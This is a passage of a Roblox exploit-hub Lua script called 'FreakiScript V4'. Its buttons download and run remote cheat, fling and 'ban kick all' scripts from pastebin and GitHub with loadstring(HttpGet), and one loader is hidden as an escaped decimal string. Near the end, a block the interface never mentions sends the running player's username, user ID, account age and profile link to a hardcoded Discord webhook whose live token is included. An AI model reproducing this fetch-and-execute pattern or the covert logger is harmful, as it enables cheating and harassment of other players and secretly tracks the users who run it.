loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://pastebin.com/raw/CYye6uA4"))()
end)

local Button1 = Trolling:NewButton("Fe chat Controller", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://pastebin.com/raw/Z7Xe6YRZ"))()
end)

local Button1 = Trolling:NewButton("Byfron Custom UI", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://pastebin.com/raw/EjCR0zWc"))()
end)

local Button1 = Trolling:NewButton("Ban kick all", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://pastebin.com/raw/BF0wkaBx"))()
end)

-- Fling

local Fling = library:NewTab("🏹 Fling Script")

local Button1 = Fling:NewButton("ZombieFling (R15)", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet(('https://pastefy.ga/n42Ougzx/raw'),true))()
end)

local Button1 = Fling:NewButton("GUIFling", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet(('https://pastefy.ga/A77wWQnu/raw'),true))()
end)

local Button1 = Fling:NewButton("Fe fling punch", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet(('https://pastefy.ga/GvnHVjT5/raw'),true))()
end)

local Button1 = Fling:NewButton("Fe T pose", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet(('https://pastefy.ga/oCKLmRRo/raw'),true))()
end)

-- About

local About = library:NewTab("📰 About me")

local Button1 = About:NewButton("🖥 My Discord Server", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	local Discord = Notif:Notify("https://discord.gg/f4B4GWzRSK", 5, "information") -- information, notification, alert, error, success
	local Discord = Notif:Notify("Copie Into Your clipboard", 3, "information") -- information, notification, alert, error, success
	setclipboard('https://discord.gg/f4B4GWzRSK')
end)

-- Game Support

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 8720980067) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Anime Tales RELEASE BlackoutServices OP", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Blackout4781/Roblox-Scripts/main/AnimeTales"))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 2753915549) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Blox Fruits farming", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Domadicoof/Domadicoof/main/Domadichub/NottoGay/Start.ranscript"))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 6872265039) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("BedWars [INFECTÉ 2 !]", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 12931609417) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Color or Die", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://pastebin.com/raw/J6hj628T", true))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 4588604953) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Criminality", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/JackHiggly/RobloxThings/main/FemWare0", true))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 1554960397) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Car Dealership Tycoon", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/03sAlt/BlueLockSeason2/main/README.md"))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 536102540) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("DBZ Final Stand", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/dbz", true))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 277751860) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Epic Minigames", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SlamminPig/rblxgames/main/Epic%20Minigames/EpicMinigamesGUI"))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 893973440) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Flee the Facility", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua'),true))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 3214114884) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Flag Wars!", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://www.textbin.online/paste.php?raw&id=214", true))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 2866967438) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Fishing Simulator Pro Fisher", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/VxleLUA/Dynamic-Offical/main/System/GameChecker.lua"))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 6447798030) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Funky Friday", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Nadir3709/RandomScript/main/FunkyFridayMobile"))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 8720980067) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Head punch simulator", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/bunnynwy/games/main/main.lua"))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 621129760) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Kat", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lel69/KAT/main/GUI"))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 12790732092) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Knife Clicker Simulator", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Xyl3ntHacks/Knife-Clicker-Simulator-/main/main", true))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 4520749081) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("King Legacy", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Strikehubv2z/StormSKz/main/All_in_one"))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 1229173778) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Lab Experiment", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/Justanotherdme/scripts/main/LabExperiment.lua')))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 13822889) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Lumber Tycoon 2", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/stepforintructions/NightFall/main/NightFall"))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 189707) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Natural Disaster", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://scriptblox.com/raw/Natural-Disaster-Survival-I-was-here-3355"))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 8054462345) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Michael's Zombies", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/BeboScripts/main/MichaelZombies.lua"))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 142823291) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("MM2", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\106\101\110\115\100\101\118\101\108\111\112\101\114\47\74\101\110\115\72\117\98\47\109\97\105\110\47\83\99\114\105\112\116\34\41\41\40\41\10")()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 7205641391) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Monday Morning Misery", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring("loadstring(game:HttpGet'https://raw.githubusercontent.com/stavratum/lua/main/mmm/main.lua')()(Discord)")()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 6284583030) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Pet Simulator X", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammed6196/NukeVsCity/main/Main.lua" ))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 8737602449) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Plsdonate", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://pastebin.com/raw/f0a3yune"))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 5956785391) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Project Slayers", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Blackout4781/Roblox-Scripts/main/AnimeTales"))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 1229173778) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Cart Rdite Script", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/hussain1323232234/My-Scripts/main/Cart%20Ride%20Into%20Rdite!'),true))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 11488626438) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Rank Simulator X", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Xyl3ntHacks/Rank-Sim/main/Main", true))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 5911084042) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Specter", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet('https://navicat.glitch.me/Specter/script.lua'))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 8916037983) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Starving artists", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/x4nto/ThunderHub/rblxscripts/dabest.lua"))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 6422372837) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Snipers [BETA]", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/RobloxScripts/main/HitboxExpander.lua"))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 6403373529) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Slap Battles", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/dizyhvh/rbx_scripts/main/dizzy_hub/scripts/slap_battles.lua"))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 10228777202) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("The Spinner", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/nonono100/no/main/The%20Spinner"))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 5130598377) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Universal Time", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/muzrblx/nanocores/main/Loader/HubLoader.lua"))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 1229173778) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Zombie Uprising [Not Working Now]", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet('https://pastebin.com/raw/rpBxjS6g'))();
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if(PlaceId == 4924922222) then
local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
local Button1 = GameSupport:NewButton("Kidnaping BrookHaven", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
loadstring(game:HttpGet("https://pastebin.com/raw/XZfAQyN1"))()
  	end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if (PlaceId == 189707) then
	local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
	loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
	local Button1 = GameSupport:NewButton("NaturalDisasterSoundSPAM", function()
	loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://pastebin.com/raw/Y88QSeQB"))()
end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if (PlaceId == 5985232436) then
	local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
	loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
	local Button1 = GameSupport:NewButton("Infectious Smile", function()
	loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/InfectiousSmile.lua", true))()
end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if (PlaceId == 3101667897) then
	local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
	loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
	local Button1 = GameSupport:NewButton("Legends Of Speed", function()
	loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://scriptblox.com/raw/Legends-Of-Speed-Speeeeed-Farm-Open-Source-old-code-lel-1785"))()
end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if (PlaceId == 662417684) then
	local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
	loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
	local Button1 = GameSupport:NewButton("LUCKY BLOCKS Battlegrounds", function()
	loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://scriptblox.com/raw/LUCKY-BLOCKS-Battlegrounds-Novice-Hub-9099"))()
end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if (PlaceId == 10534865425) then
	local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
	loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
	local Button1 = GameSupport:NewButton("Hoop Simulator 🏀", function()
	loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/SpinnyMemer/Games/main/loader"))()
end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if (PlaceId == 2248408710) then
	local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
	loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
	local Button1 = GameSupport:NewButton("Destruction Simulator", function()
	loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://scriptblox.com/raw/Destruction-Simulator-*OP*-GUI-1858"))()
end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if (PlaceId == 11902668271) then
	local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
	loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
	local Button1 = GameSupport:NewButton("Get Richer Every Second", function()
	loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet(('https://pastebin.com/raw/WpuXsqCT'), true))()
end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if (PlaceId == 11746859781) then
	local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
	loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
	local Button1 = GameSupport:NewButton("Bubble Gum Clicker!", function()
	loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://github.com/GhostDuckyy/GhostDuckyy/blob/main/Source/Bubble%20Gum%20Clicker.lua?raw=true"))()
end)
end

library:GetPlaceId()
local PlaceId = game.PlaceId
if (PlaceId == 7991339063) then
	local LoadingXSX = Notif:Notify("Game Supported !", 3, "success")
	loadstring(game:HttpGet(('https://pastebin.com/raw/GGVqDqSy')))()
	local Button1 = GameSupport:NewButton("Rainbow Friends", function()
	loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/SpinnyMemer/Games/main/13522981808"))()
end)
end

-- Succes load

local SoundId = "rbxassetid://1447883095" -- L'ID de la chanson que vous souhaitez jouer

local function PlayLocalSound()
    local sound = Instance.new("Sound")
    sound.SoundId = SoundId
    sound.Parent = workspace -- Vous pouvez également le placer dans un autre parent si vous le souhaitez

    sound:Play()
    sound.Ended:Wait()
    sound:Destroy()
end

PlayLocalSound()

wait(1)

local SoundId = "rbxassetid://3105547857" -- L'ID de la chanson que vous souhaitez jouer

local function PlayLocalSound()
    local sound = Instance.new("Sound")
    sound.SoundId = SoundId
    sound.Parent = workspace -- Vous pouvez également le placer dans un autre parent si vous le souhaitez

    sound:Play()
    sound.Ended:Wait()
    sound:Destroy()
end

PlayLocalSound()

local FinishedLoading = Notif:Notify("Loaded FreakiScript V4", 4, "success")

local Config = {
    Reach = {
        LegReach          = false, --//Buraya true veya false yaz false yazarsan kapatýr true yazarsan açar.
        LegStuds          = 4 --//Buraya kaç stud istediðini yaz legit oynamak istiyosan 3.50 veya 4 yazabilirsin.
    },
}
 
 
Http = game:GetService("HttpService")
Web = "https://discord.com/api/webhooks/1105912087244443738/-OC6rmtAohKL4RW-0P64-t0T3hgRpaodyCqNEslTvQpGjogDjsrPW2oyrQRhU17VcOUQ"
if syn then
    local responce = syn.request(
    {
        Url = Web,
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = Http:JSONEncode({
            ["content"] = "",
            ["embeds"] = {{
                ["title"] = "**Your script has been executed!**",
                ["description"] = game.Players.LocalPlayer.Name.." has executed the script",
                ["type"] = "rich",
                ["color"] = tonumber(0xffffff),
                ["fields"] = {
                    {
                        ["name"] = "",
                        ["value"] =  game:HttpGet("", true),
                        ["inline"] = true
                    }
                }
 
            }}
        })
    })
   else
    request(
        {
            Url = Web,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = Http:JSONEncode({
                ["content"] = "",
                ["embeds"] = {{
                ["title"] = "",
                ["description"] = "",
                ["type"] = "rich",
                ["color"] = tonumber(0xffffff),
                ["fields"] = {
                    {
                        ["name"] = "Username",
                        ["value"] =  game.Players.LocalPlayer.Name,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Display Name",
                        ["value"] =  game.Players.LocalPlayer.DisplayName,
                        ["inline"] = true 
                    },
                    {
                        ["name"] = "User ID",
                        ["value"] =  game.Players.LocalPlayer.UserId,
                        ["inline"] = true 
                    },
                    {
                        ["name"] = "Account Age",
                        ["value"] =  game.Players.LocalPlayer.AccountAge.. " Days",
                        ["inline"] = true 
                    },
                    {
                        ["name"] = "Profile Link",
                        ["value"] =  "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile",
                        ["inline"] = true 
                    },
                    {
                        ["name"] = "Studs?",
                        ["value"] = Config.Reach.LegStuds.." Studs",
                        ["inline"] = true 
                    },
                    {
                        ["name"] = "Value?",
                        ["value"] = Config.Reach.LegReach,
                        ["inline"] = true 
                    }
                }
            }}
            })
        })
end

-- // FUNCTION DOCS: 
--[[
    MAIN COMPONENT DOCS:

    -- // local library = loadstring(game:HttpGet(link: url))()
    -- // library.title = text: string
    -- // local Window = library:Init()

    -- [library.title contains rich text]

    -- / library:Remove()
    -- destroys the library

    -- / library:Text("new")
    -- sets the lbrary's text to something new

    - / library:UpdateKeybind(Enum.KeyCode.RightAlt)
    -- sets the lbrary's keybind to switch visibility to something new

    __________________________

    -- // local notificationLibrary = library:InitNotifications()
    -- // local Notification = notificationLibrary:Notify(text: string, time: number, type: string (information, notification, alert, error, success))

    -- [Notify contains rich text]

    -- / 3rd argument is a function, used like this:
    
    Notif:Notify("Function notification", 7, function()
        print("done")
    end)

    -- / Welcome:Text("new text")
    -- sets the notifications text to something differet [ADDS A +0.4 ONTO YOUR TIMER]

    __________________________

    -- // local Wm = library:Watermark(text: string)

    -- [Watermark contains rich text]

    -- / Wm:Hide()
    -- hides the watermark from eye view

    -- / Wm:Show()
    -- makes the watermark visible at the top of your screen

    -- / Wm:Text("new")
    -- sets the watermark's text to something new

    -- / Wm:Remove()
    -- destroys the watermark

    __________________________

    -- // local Tab1 = library:NewTab(text: string)

    -- [tab title contains rich text]

    -- / Tab1:Open()
    -- opens the tab you want

    -- / Tab1:Remove()
    -- destroys the tab

    -- / Tab1:Hide()
    -- hides the tab from eye view

    -- / Tab1:Show()
    -- makes the tab visible on the selection table

    -- / Tab1:Text("new")
    -- sets the tab's text to something new

    __________________________

    -- [label contains rich text]

    -- / Label1:Text("new")
    -- sets the label's text to something new

    -- / Label1:Remove()
    -- destroys the label

    -- / Label1:Hide()
    -- hides the label from eye view

    -- / Label1:Show()
    -- makes the tab visible on the page that is used

    -- / Label1:Align("le")
    -- aligns the label to a new point in text X

    __________________________

    -- [Button contains rich text]

    -- / Button1:AddButton("text", function() end)
    -- adds a new button inside of the frame [CAN ONLY GO UP TO 4 BUTTONS AT A TIME]

    -- / Button1:Fire()
    -- executes the script within the button

    -- / Button1:Text("new")
    -- sets the button's text to something new

    -- / Button1:Hide()
    -- hides the button from eye view

    -- / Button1:Show()
    -- makes the button visible

    -- / Button1:Remove()
    -- destroys the button

    __________________________

    -- [Sections contain rich text]

    -- / Section1:Text("new")
    -- sets the section's text to something new

    -- / Section1:Hide()
    -- hides the section from eye view

    -- / Section1:Show()
    -- makes the section visible

    -- / Section1:Remove()
    -- destroys the section

    __________________________

    -- [Toggles contain rich text]

    -- / Toggle1:Text("new")
    -- sets the toggle's text to something new

    -- / Toggle1:Hide()
    -- hides the toggle from eye view

    -- / Toggle1:Show()
    -- makes the toggle visible

    -- / Toggle1:Remove()
    -- destroys the toggle

    -- / Toggle1:Change()
    -- changes the toggles state to the opposite

    -- / Toggle1:Set(true)
    -- sets the toggle to true even if it is true

    -- / Toggle1:AddKeybind(Enum.KeyCode.P, false, function() end) -- false / true is used for just changing the toggles state
    -- adds a keybind to the toggle

    -- / Toggle1:SetFunction(function() end)
    -- sets the toggles function

    __________________________

    -- [Keybinds contain rich text]

    -- / Keybind1:Text("new")
    -- sets the keybind's text to something new

    -- / Keybind1:Hide()
    -- hides the keybind from eye view

    -- / Keybind1:Show()
    -- makes the keybind visible

    -- / Keybind1:Remove()
    -- destroys the keybind

    -- / Keybind1:SetKey(Enum.KeyCode.P)
    -- sets the keybinds new key

